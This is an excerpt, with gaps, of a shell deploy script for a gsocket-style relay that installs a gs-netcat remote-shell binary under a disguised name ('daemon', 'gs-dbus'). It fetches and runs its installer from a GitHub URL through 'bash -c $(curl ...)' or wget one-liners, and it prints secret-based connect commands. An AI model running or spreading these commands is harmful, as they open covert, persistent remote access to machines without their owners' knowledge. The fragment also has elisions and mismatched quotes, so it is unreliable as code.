...
#
# Connect
#   $ Z=MySecret bash -c "$(curl -fsSL https://raw.githubusercontent.com/paylar/relay/main/gsc)""
# Pre-set a secret:
#   $ T=MySecret bash -c "$(curl -fsSL https://raw.githubusercontent.com/paylar/relay/main/gsc)"
# Uninstall
#   $ UNIN=1 bash -c" $(curl -fsSL https://raw.githubusercontent.com/paylar/relay/main/gsc)"
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
...
DL_CRL="bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/paylar/relay/main/gsc)\""
DL_WGT="bash -c \"\$(wget -qO- https://raw.githubusercontent.com/paylar/relay/main/gsc)\""

# Name Default Bin File
BIN_HIDDEN_NAME_DEFAULT="daemon"
...
HOWTO_CONNECT_OUT()
{
	...
	echo -e "--> To uninstall use ${CM}UNIN=1 ${DL_CMD}${CN}"
	echo -e "--> To connect use one of the following:
--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
--> ${CM}Z=\"${GS_SECRET}\" ${DL_CRL}${CN}
--> ${CM}Z=\"${GS_SECRET}\" ${DL_WGT}${CN}"
}
...
gs_access()
{
	...
	[[ $ret -eq 61 ]] && {
		...
		echo -e 2>&1 "--> ${CM}T=\"${GS_SECRET}\" ${DL_CRL}${CN}"
		echo -e 2>&1 "--> ${CM}T=\"${GS_SECRET}\" ${DL_WGT}${CN}"
	}
...
gs_start()
{
	...
	# UNIN=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
...
[[ -n "$UNIN" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
...
if [[ -z $Z ]]; then
	...
	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, T=${GS_SECRET_X})"
else
	GS_SECRET="$Z"
